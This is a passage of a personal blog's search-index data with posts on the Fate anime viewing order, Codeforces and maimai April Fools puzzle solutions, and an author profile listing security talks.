F/SN first before Fate/Zero to understand the character development. Below I’ll list them in broadcast order with brief comments. Tip ✿ The following anime broadcast times are in “seasons” - for example, “06W” = Jan-Mar 2006, and so on. ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:1:0","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fate-main-story"},{"categories":["Entertainment ACGN"],"content":" Fate/Stay Night (Fate Route / Saber Route) [06W, 06Sp] 24 Episodes Animation: Studio DEEN First anime adaptation of the Fate series, abbreviated as 06FSN Based on the Fate route, but touches on some UBW and HF route content The art style has a significant gap compared to today’s standards. Watch it if you can accept it :\u003e ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:1:1","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fatestay-night-fate-route--saber-route-06w-06sp-24-episodes"},{"categories":["Entertainment ACGN"],"content":" Fate/Stay Night (UBW Route / Rin Route) [Movie (2010)] 1 Film UBW stands for Unlimited Blade Works Made by Studio DEEN animation company, so some call it Deen UBW This film received poor reviews due to compressed animation and story. Watch at your own discretion In 2014, ufotable made a 26-episode anime of the same UBW route, so this movie is basically recommended to skip ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:1:2","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fatestay-night-ubw-route--rin-route-movie-2010-1-film"},{"categories":["Entertainment ACGN"],"content":" Fate/Zero [11F, 12Sp] 24 Episodes Abbreviated F/Z, the prequel to Fate/Stay Night aka the Fourth Holy Grail War Animated by ufotable, quality guaranteed The Fate spinoff Lord El-Melloi II Case Files features Waver from Fate/Zero as the protagonist Basically Fate/Zero only has one storyline, highly recommended! ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:1:3","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fatezero-11f-12sp-24-episodes"},{"categories":["Entertainment ACGN"],"content":" Fate/Stay Night (UBW Route / Rin Route) [14F, 15Sp] 26 Episodes Same world line as the 2010 movie, often called UBW TV version to distinguish it Made by the great ufotable, with very refined animation and brilliant action scenes, highly recommended! If you can’t accept the earlier 06FSN or 2010 UBW movie, you can start with this and F/Z to understand the world, then decide what to watch next ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:1:4","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fatestay-night-ubw-route--rin-route-14f-15sp-26-episodes"},{"categories":["Entertainment ACGN"],"content":" Fate/Stay Night (HF Route / Sakura Route) [Movies (2017-2020)] 3 Films HF stands for Heaven’s Feel Has the most content among the three world lines, and is the key to solving mysteries in the PC game (HF route only unlocks after completing Saber and UBW routes) Released as three theatrical chapters: 2017.10 《I. presage flower》 2019.01 《II. lost butterfly》 2020.08 《III. spring song》 Many early plot details are omitted. It’s recommended to at least watch the 2014 UBW TV series above, or even add Fate/Zero to better understand character relationships. ufotable quality guaranteed. Those battle scenes with 4DX really kept me trembling with excitement\u003e\u003c, highly recommended! ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:1:5","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fatestay-night-hf-route--sakura-route-movies-2017-2020-3-films"},{"categories":["Entertainment ACGN"],"content":" Lord El-Melloi II Case Files [19Su] 13 Episodes + EP.0 Subtitle: -Rail Zeppelin Grace note- Set ten years after the Fourth Holy Grail War (Fate/Zero), featuring Fate/Zero character Waver as protagonist The “Mystic Eyes” setting references TM world’s Kara no Kyoukai and Tsukihime Classification-wise it should be in spinoffs, but the story frequently references Waver’s perspective of Fate/Zero scenes, so I personally consider it a main story extension ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:1:6","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#lord-el-melloi-ii-case-files-19su-13-episodes--ep0"},{"categories":["Entertainment ACGN"],"content":" Fate Spinoffs","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:2:0","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fate-spinoffs"},{"categories":["Entertainment ACGN"],"content":" Fate/kaleid liner Prisma Illya Series Features Illya, a character from F/SN, as the protagonist. Drawn by Hiroyama Hiroshi, an artist who loves Illya so much that he drew Illya doujin manga and even produced multiple anime seasons. I guess that’s love~ A completely parallel world that uses F/SN settings with some added strange fantasy elements (hey) Currently has four seasons + 1 OVA + 2 movies: Fate/kaleid liner Prisma Illya [13Su] 10 Episodes Fate/kaleid liner Prisma Illya 2wei! [14Su] 10 Episodes Fate/kaleid liner Prisma Illya 2wei Herz! [15Su] 10 Episodes Fate/kaleid liner Prisma Illya 3rei!! [16Su] 12 Episodes Fate/kaleid liner Prisma Illya: Oath Under Snow [Movie (2017)] Fate/kaleid liner Prisma Illya: Prisma Phantasm [OVA (2019)] Fate/kaleid liner Prisma Illya: Licht - The Nameless Girl [Movie (2021)] (News of Licht sequel anime was announced at Illya’s 10th anime anniversary event in 2023/08) Simply put, because Illya faces various tragedies in the main story, they created a peaceful world line for her (?) Hiroyama Hiroshi @hiroshi_, after UBW-TV EP 15 broadcast in 2015 今なら、なんで俺がプリズマ☆イリヤを描こうと思ったのか分かってくれる方が多いの ではないでしょうか。(Now everyone should understand why I wanted to draw Prisma Illya.) イリヤは死なないわ。私が（10年かけて）守るもの。(Illya will live forever. I’ve spent 10 years protecting her.) ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:2:1","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fatekaleid-liner-prisma-illya-series"},{"categories":["Entertainment ACGN"],"content":" Fate/Apocrypha [17Su, 17F] 25 Episodes Abbreviated F/Ap because the second A is hard to pronounce Originally a scrapped online game project (Fate Online Project), later published as a novel (author: Yuichiro Higashide) Timeline is after the Third Holy Grail War, a subspecies Holy Grail War occurring elsewhere The story is a big melee where two factions each summon seven Servants. Although the anime received quite a few negative reviews, I really like it! I remember finishing the novel online with translations back when nobody in Taiwan was discussing it yet lol ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:2:2","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fateapocrypha-17su-17f-25-episodes"},{"categories":["Entertainment ACGN"],"content":" Fate/Grand Order The legendary mobile game FGO (permanent gacha revenue chart leader). Thanks to all the whales for giving us anime to watch ᕕ ( ᐛ ) ᕗ Most single-episode anime come from the annual Fate Project New Year’s Eve TV Special Current FGO-related anime: Fate/Grand Order -First Order- [Long Episode (2016)] 1 Episode Fate/Grand Order -MOONLIGHT/LOSTROOM- [Short Episode (2017)] 1 Episode Fate/Grand Order × Himuro’s World 7 Most Powerful Great Figures [Long Episode (2017)] 1 Episode Singularity 7: Absolute Demonic Front Babylonia [19F] 21 Episodes + EP.0 Singularity 6: Divine Realm of the Round Table Camelot [Movies] 2 Films 2020/12 Part 1 “Wandering; Agateram” 2021/05 Part 2 “Paladin; Agateram” Fate/Grand Carnival [OVA (2021)] 2 Episodes Similar style to TM’s commemorative anime “Carnival Phantasm (2011)” Final Singularity: Grand Temple of Time Solomon [Movie (2021)] 1 Film Fate/Grand Order: Fujimaru Ritsuka Doesn’t Get It [Anime Shorts (2022-2023)] 33 Episodes + Special ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:2:3","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fategrand-order"},{"categories":["Entertainment ACGN"],"content":" Fate/EXTRA Last Encore [18W] 13 Episodes Based on PSP game Fate/EXTRA (2010), followed by Fate/EXTRA CCC (2013) and Fate/EXTELLA (2016) A new chapter inheriting F/SN’s worldview, animated by SHAFT Chapters broadcast separately as “Oblitus Copernican Theory” and “Illustrias Geocentric Theory” In 2020/07, TM’s subsidiary Studio BB announced development of remake “Fate/EXTRA Record”, but no further updates since ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:2:4","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fateextra-last-encore-18w-13-episodes"},{"categories":["Entertainment ACGN"],"content":" Today’s Menu for the Emiya Family [Web Anime (2018-2019)] 13 Episodes Abbreviated Emiya Gohan, animated by ufotable, broadcast at one episode per month in 2018 Basically an F/SN-based adaptation about gathering a bunch of people to eat, aka a foodie show ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:2:5","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#todays-menu-for-the-emiya-family-web-anime-2018-2019-13-episodes"},{"categories":["Entertainment ACGN"],"content":" Fate/strange Fake [2023, 2024, 2026] 13 Episodes (planned) + EP.0 Animated by A-1 Pictures Pilot anime broadcast in 2023-07 as a one-hour special, subtitled -Whispers of Dawn- (I’d call it EP.0) Set several years after the Fifth Holy Grail War, a false Holy Grail War occurring in the American West EP.1 broadcast during 2024-12-31 New Year’s Eve, with announcement of seasonal broadcast in 2026 Now airing in 2026-01! ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:2:6","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#fatestrange-fake-2023-2024-2026-13-episodes-planned--ep0"},{"categories":["Entertainment ACGN"],"content":" Other TM Series","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:3:0","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#other-tm-series"},{"categories":["Entertainment ACGN"],"content":" Shingetsutan Tsukihime [03F] 12 Episodes The original PC game Tsukihime was released at C59 in 2000 (TM’s first work) Due to excessive compression and the director’s personal insistence, Tsukihime fans call the anime a dark history, an anime that doesn’t exist I personally got into Tsukihime through this anime and found it acceptable. I also finished the manga afterward \\ Arcueid is beautiful as a painting / ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:3:1","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#shingetsutan-tsukihime-03f-12-episodes"},{"categories":["Entertainment ACGN"],"content":" Kara no Kyoukai (Garden of Sinners) [Movies (2007-2011)] 8 Films Shares a worldview with Tsukihime The theatrical version has eight chapters, with release dates and titles as follows: 2007/12 Chapter 1: Overlooking View 2007/12 Chapter 2: Murder Speculation (Part 1) 2008/01 Chapter 3: Remaining Sense of Pain 2008/05 Chapter 4: The Hollow Shrine 2008/08 Chapter 5: Paradox Spiral 2008/12 Chapter 6: Oblivion Recording 2009/08 Chapter 7: Murder Speculation (Part 2) 2011/02 Epilogue: Kara no Kyoukai The plot is somewhat mystical and the timeline isn’t presented in order, I honestly almost fell asleep during some parts back then. ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:3:2","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#kara-no-kyoukai-garden-of-sinners-movies-2007-2011-8-films"},{"categories":["Entertainment ACGN"],"content":" Carnival Phantasm [OVA (2011)] 12 Episodes TM 10th anniversary commemorative anime with fun stories, various TM crossovers and character gags Basically a mash-up. I recommend watching at least Fate/Stay Night and Tsukihime to understand the jokes XD ","date":"2019-08-26","objectID":"/en/posts/2019/fate-anime-talk/:3:3","series":null,"tags":["TypeMoon","Fate"],"title":"[TYPE-MOON] A Brief Look at the Fate Series World (Anime Edition)","uri":"/en/posts/2019/fate-anime-talk/#carnival-phantasm-ova-2011-12-episodes"},{"categories":["Programming"],"content":"Codeforces 2019 April Fools programming contest problem analysis","date":"2019-04-02","objectID":"/en/posts/2019/codeforces-april-fools-day-2019/","series":null,"tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/en/posts/2019/codeforces-april-fools-day-2019/"},{"categories":["Programming"],"content":"I heard this is an April Fools event that Codeforces holds every year. This time I experienced what nonsensical puzzle-solving is like XD Except for Problem A which was fairly normal, the rest were all guessing games (basically a psychic contest). After the competition, I managed to solve pB, pC, and pD through some clues. Feel free to contact me if there are any errors \u003e\u003c ","date":"2019-04-02","objectID":"/en/posts/2019/codeforces-april-fools-day-2019/:0:0","series":null,"tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/en/posts/2019/codeforces-april-fools-day-2019/#"},{"categories":["Programming"],"content":" Problem A - Thanos SortAn interesting sorting method that keeps halving and deleting until the remaining sequence is OK. Looking at the scoreboard, this problem was quite peaceful. I also ACed it by slowly running recursion~ This was probably meant as a warm-up from the problem setters~ ","date":"2019-04-02","objectID":"/en/posts/2019/codeforces-april-fools-day-2019/:1:0","series":null,"tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/en/posts/2019/codeforces-april-fools-day-2019/#problem-a---thanos-sort"},{"categories":["Programming"],"content":" Problem B - Kanban NumbersThe problem is so short you don’t even need to click the link XD Input $a (1≤a≤99)$, output “Yes” or “No”. People were guessing all sorts of things on the scoreboard, with over 100 submissions being common. Unfortunately, I saw more people ACing pD so I didn’t spend time guessing this one. The answer is hidden in the problem title… “kanban”. If you put it in Google Translate, you’ll get “signboard” in Japanese, but actually it should be split into “kan” and “ban”. “Kan” has no meaning itself, while “ban” means prohibition, so the answer is “ban kan”. Huh??? Well, that’s it. Actually, the letters k and a don’t appear in the English spelling of any number. So you just need to check if the input number has n in its spelling XD You really can’t use normal thinking to solve these puzzles… ","date":"2019-04-02","objectID":"/en/posts/2019/codeforces-april-fools-day-2019/:2:0","series":null,"tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/en/posts/2019/codeforces-april-fools-day-2019/#problem-b---kanban-numbers"},{"categories":["Programming"],"content":" Problem C - Mystery CircuitThe problem gave a mysterious circuit… then asked you to input $a (0≤a≤15)$ and output an integer, that’s it. Honestly, I was clueless after fiddling with this for a long time. But a friend assembled the circuit in Quirk, threw in 0101 to test, and found the answer. How random XD Here’s the code. If you’re not a player in that field, you probably wouldn’t think of this… cpp #include \u003ciostream\u003e using namespace std; int main(){ int n; cin \u003e\u003e n; int arr[] = {15, 14, 12, 13, 8, 9, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7}; cout \u003c\u003c arr[n] \u003c\u003c endl; return 0; } ","date":"2019-04-02","objectID":"/en/posts/2019/codeforces-april-fools-day-2019/:3:0","series":null,"tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/en/posts/2019/codeforces-april-fools-day-2019/#problem-c---mystery-circuit"},{"categories":["Programming"],"content":" Problem D - Pigeon d’OrThe problem I spent the most time on. Honestly, I was just one step away from solving it QQ At first glance, I really couldn’t understand the problem, so I put it in Google Translate… Hmm, still couldn’t understand it. I even wondered what language it was, but most of it was clearly understandable English QQ Later I started guessing from the test data: The sample gave five numbers and got one number, and the input number range was within 32. Based on past experience, it might be a logical operation, and the most commonly used one for this type of problem is XOR. So I tried every possible way to match the sample with XOR to get the answer, which resulted in several WAs. I was convinced the next submission would definitely AC (no it wouldn’t.jpg) But later when I got stuck, I read the problem several more times… and thought maybe the problem setter intentionally misspelled things!? The first paragraph’s “ftying rats” felt like it should be “flying rats”, so I tried several methods to test for misspellings. In the end, I used Word’s built-in spell check, and there were indeed quite a few misspellings lol With my terrible English, I slowly picked out the misspelled letters… and then the contest ended (damn) After the contest, I solved it and saw this magical… word? twoplusxorofthirdandminelements Simple analysis… two plus XOR of third and min elements (The third input number) ^ (minimum value in the sequence) + 2. Surprisingly, I guessed XOR earlier, but this solution was really unexpected XDDD If I had noticed the spelling bug in the problem earlier, I might have solved it in time qq That’s about it. The thinking process was really interesting XD Since there were no other clues given, you could only make random guesses. Seeing people AC after over a hundred attempts wasn’t surprising at all. Instead, I thought “It’s amazing they actually guessed it right!” ","date":"2019-04-02","objectID":"/en/posts/2019/codeforces-april-fools-day-2019/:4:0","series":null,"tags":["Codeforces","April Fools' Day","Competitive Programming"],"title":"[Codeforces] April Fools Day Contest 2019","uri":"/en/posts/2019/codeforces-april-fools-day-2019/#problem-d---pigeon-d"},{"categories":["Entertainment ACGN"],"content":"Maimai rhythm game 2019 April Fools event puzzle walkthrough and solutions","date":"2019-04-02","objectID":"/en/posts/2019/maimai-april-fools-day/","series":null,"tags":["Rhythm Games","April Fools' Day"],"title":"[Maimai] 2019 April Fools Puzzle \u003cRage Hammer - Mitsuyoshi's Mystery\u003e","uri":"/en/posts/2019/maimai-april-fools-day/"},{"categories":["Entertainment ACGN"],"content":" It’s that time of year again for April Fools, and the internet is inevitably flooded with fake news. The maimai official team released their annual April Fools limited song as usual, but! This time there’s also a puzzle easter egg event XD To avoid spoilers, I specifically waited until after April 1st to post this~ This year, SEGA’s three rhythm game arcades - maimai, CHUNITHM, and Ongeki - all had corresponding April Fools events. Unfortunately, only maimai is available in Taiwan; the other two are Japan-exclusive. What a shame QQ First, here’s the YouTube external output video we used for puzzle-solving. The puzzles are hidden in the background animations. I think they were worried about early spoilers, so explanation videos with puzzle-solving content only started appearing gradually after April 2nd. As you can see above, the chart is quite… chaotic(?). Since many taps and slides weren’t hit properly, we really had to watch it at 0.25x speed repeatedly for puzzle-solving (# Now let's solve the puzzles!! w Note All images below reference Bruno’s external output. I have to say the video quality is really well done!! ","date":"2019-04-02","objectID":"/en/posts/2019/maimai-april-fools-day/:0:0","series":null,"tags":["Rhythm Games","April Fools' Day"],"title":"[Maimai] 2019 April Fools Puzzle \u003cRage Hammer - Mitsuyoshi's Mystery\u003e","uri":"/en/posts/2019/maimai-april-fools-day/#"},{"categories":["Entertainment ACGN"],"content":" Question 1: “本物を順番に読め” (Read the real ones in order)Translated, it means “Find the real ones and read them in order.” As shown in the video, there’s a massive mix of pink taps and holds. Some are meant to be hit, but others are just background animation intrusions. It’s really… annoying XD The solution is to find the taps that need to be hit (the real ones), as shown below. You can see they even removed the surrounding kana from the last note. So mean~ The answer is “わからない” (wakaranai), referencing the maimai original song 分からない (I Don’t Know) ","date":"2019-04-02","objectID":"/en/posts/2019/maimai-april-fools-day/:1:0","series":null,"tags":["Rhythm Games","April Fools' Day"],"title":"[Maimai] 2019 April Fools Puzzle \u003cRage Hammer - Mitsuyoshi's Mystery\u003e","uri":"/en/posts/2019/maimai-april-fools-day/#question-1-本物を順番に読め-read-the-real-ones-in-order"},{"categories":["Entertainment ACGN"],"content":" Question 2: “正確になぞり出てくる金の文字を読め” (Read the golden letters that appear when traced correctly)The question asks us to pay attention to “golden letters that appear when traced correctly.” I have to say this was the one we got stuck on the longest. We tried copying down the gold blocks that appeared in the background animation, but had absolutely no clue… At most we could guess they were parts of kana characters, and we naively pulled out the hiragana chart and started guessing randomly XDDDD We couldn’t solve it so we just skipped it. We only came back when the final question required this answer, and after looking at it for about half an hour, we gave up. After seeing the solution online, I was really speechless lol It turns out the “golden letters” also include the Perfect that appears after completing a slide, but the external output we used for puzzle-solving didn’t complete the slides (((# The rest of the solution is in the image below~ Really unexpected The last character is really mean. Right after the slide’s Perfect yellow bar ends, a dot suddenly appears in the background animation… (I even had to split it into two screenshots~ The answer is “トパゾライト” (Topazoraito), referencing the composer t+pazolite (this guy has written quite a few terrifying boss songs). ","date":"2019-04-02","objectID":"/en/posts/2019/maimai-april-fools-day/:2:0","series":null,"tags":["Rhythm Games","April Fools' Day"],"title":"[Maimai] 2019 April Fools Puzzle \u003cRage Hammer - Mitsuyoshi's Mystery\u003e","uri":"/en/posts/2019/maimai-april-fools-day/#question-2-正確になぞり出てくる金の文字を読め-read-the-golden-letters-that-appear-when-traced-correctly"},{"categories":["Entertainment ACGN"],"content":" Question 3: “同じ数字には同じ文字” (Same numbers have same letters)This was probably the fastest one we solved XDDD The question roughly means “Match same numbers to same letters, then spell out the last sentence.” The difficulty, if any… was that the background animation shook a lot lot lot lot lot. Bruno’s processed video was much clearer~ Just fill in maimai’s four judgment texts - Perfect, Great, Good, Miss - and you’re done~ The answer is “desperete (デスパレイト)”, referencing the maimai original song デスパレイト (Desperate). ","date":"2019-04-02","objectID":"/en/posts/2019/maimai-april-fools-day/:3:0","series":null,"tags":["Rhythm Games","April Fools' Day"],"title":"[Maimai] 2019 April Fools Puzzle \u003cRage Hammer - Mitsuyoshi's Mystery\u003e","uri":"/en/posts/2019/maimai-april-fools-day/#question-3-同じ数字には同じ文字-same-numbers-have-same-letters"},{"categories":["Entertainment ACGN"],"content":" Question 4: “囲われた文字を数字の順に読め” (Read the enclosed letters in numerical order)At first I couldn’t even understand the question (not good at Japanese), so I did a quick search. The question means “Read the enclosed letters in numerical order”… Simple XD The answer is “せんたくき” (sentakuki), which in kanji is “洗濯機” (washing machine) …I probably don’t need to explain further lol ","date":"2019-04-02","objectID":"/en/posts/2019/maimai-april-fools-day/:4:0","series":null,"tags":["Rhythm Games","April Fools' Day"],"title":"[Maimai] 2019 April Fools Puzzle \u003cRage Hammer - Mitsuyoshi's Mystery\u003e","uri":"/en/posts/2019/maimai-april-fools-day/#question-4-囲われた文字を数字の順に読め-read-the-enclosed-letters-in-numerical-order"},{"categories":["Entertainment ACGN"],"content":" Final Question: “流れ星を読め” (Read the shooting stars)Lots of taps, slides, breaks, and boths - it’s not hard to see these are the symbols used as questions for the first four puzzles. The question means “Read along the shooting stars,” and it’s not hard to guess these refer to the slides. The rest is just aligning the characters~ Since the background animation was also shaking like crazy, I had to rewind quite a few times… text わから［な］い とぱ［ぞ］らいと ですぱれい［と］ せんたく［き］ The answer is “なぞとき” (nazotoki), which in kanji is “謎解き” (puzzle-solving) - the theme of this event~ At the time we couldn’t solve the second question and tried to brute-force this one. But it turned out to be a voiced consonant “ぞ” - how could we possibly guess that QQQ . . . Hm? You think it’s over… Not yet! When you enter all five answers on the website, besides getting some avatars/backgrounds/titles, you also get five more images == From left to right are Questions 1 through the Final Question. There’s a sense of déjà vu… Yes! It’s the eight kana characters listed in Question 1. Spell them out in order and enter “さらなる謎(MASTER)” on the website. The answer is “ながいき” (nagaiki), which in kanji is “長生き” (long life). Although we solved it, I couldn’t find any reference after searching for a long time. Maybe it’s hinting that maimai will continue on~ That’s about where it ends. The rest involves CHUNITHM and Ongeki, two games we can’t play, so we had to give up (# ","date":"2019-04-02","objectID":"/en/posts/2019/maimai-april-fools-day/:5:0","series":null,"tags":["Rhythm Games","April Fools' Day"],"title":"[Maimai] 2019 April Fools Puzzle \u003cRage Hammer - Mitsuyoshi's Mystery\u003e","uri":"/en/posts/2019/maimai-april-fools-day/#final-question-流れ星を読め-read-the-shooting-stars"},{"categories":["Entertainment ACGN"],"content":" Easter EggBy the way… while solving the puzzles, we accidentally found an easter egg in the website’s source code XD ここにヒントはありませ (There are no hints here). LOL ᕕ ( ᐛ ) ᕗ ","date":"2019-04-02","objectID":"/en/posts/2019/maimai-april-fools-day/:6:0","series":null,"tags":["Rhythm Games","April Fools' Day"],"title":"[Maimai] 2019 April Fools Puzzle \u003cRage Hammer - Mitsuyoshi's Mystery\u003e","uri":"/en/posts/2019/maimai-april-fools-day/#easter-egg"},{"categories":null,"content":" About MeHi! This is Cyris (aka @yctseng1227), a newbie in Cybersecurity. Threat Researcher @Trend Micro Former CTF Team Member @MacacaHub ","date":"0001-01-01","objectID":"/en/about/:1:0","series":null,"tags":null,"title":"About","uri":"/en/about/#about-me"},{"categories":null,"content":" Interests Threat Hunting Network Security Competitive Programming Japanese Anime \u0026 Music Music Game: beatmania IIDX✨, DrumMania, Maimai FINAL FANTASY XIV (since 2022✨) ","date":"0001-01-01","objectID":"/en/about/:2:0","series":null,"tags":null,"title":"About","uri":"/en/about/#interests"},{"categories":null,"content":" Presentations 2024 | The Infinite Game: Against Earth Hundun and their Bear Corps | DECODE Talk 🇵🇭 2021 | 關於網路的資安大小事 | NKNUSH Lecture 🇹🇼 2021 | Cloud Gaming System and Security | CISC Talk (Online) 🇹🇼 2020 | 基礎網頁安全演練 feat. MacacaHub | CISC Workshop 🇹🇼 2018 | 那些關於寫程式的三兩事 | NUK Lecture 🇹🇼 ","date":"0001-01-01","objectID":"/en/about/:3:0","series":null,"tags":null,"title":"About","uri":"/en/about/#presentations"}]